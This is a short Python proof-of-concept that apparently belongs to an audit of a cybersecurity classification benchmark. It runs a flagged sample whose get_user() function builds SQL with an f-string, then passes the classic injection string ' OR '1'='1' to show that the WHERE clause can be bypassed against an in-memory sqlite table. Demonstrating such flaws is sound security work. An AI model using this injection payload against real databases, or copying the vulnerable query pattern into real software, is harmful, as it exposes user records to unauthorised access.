# PoC — runs the actual flagged sample-0643.py from the dataset
# (representative of sample-0643/0646/0649/0652/0655.py, all identical).
# No extra deps (sqlite3 stdlib).
# get_user() builds its SQL with an f-string -- any username string
# controls the WHERE clause.

import runpy
import sqlite3
from pathlib import Path

conn = sqlite3.connect(":memory:")
cursor = conn.cursor()
cursor.execute("CREATE TABLE users (username TEXT, role TEXT)")
cursor.executemany("INSERT INTO users VALUES (?, ?)", [("alice", "user"), ("admin", "admin")])
conn.commit()

flagged = (Path(__file__).resolve().parents[3] / "Dataset" / "flagged"
           / "torchsight__cybersecurity-classification-benchmark" / "malicious" / "sample-0643.py")
mod = runpy.run_path(str(flagged), init_globals={"cursor": cursor})

print("get_user('alice'):        ", mod["get_user"]("alice"))
print("get_user(\"' OR '1'='1\"):", mod["get_user"]("' OR '1'='1"))  # <- the trigger
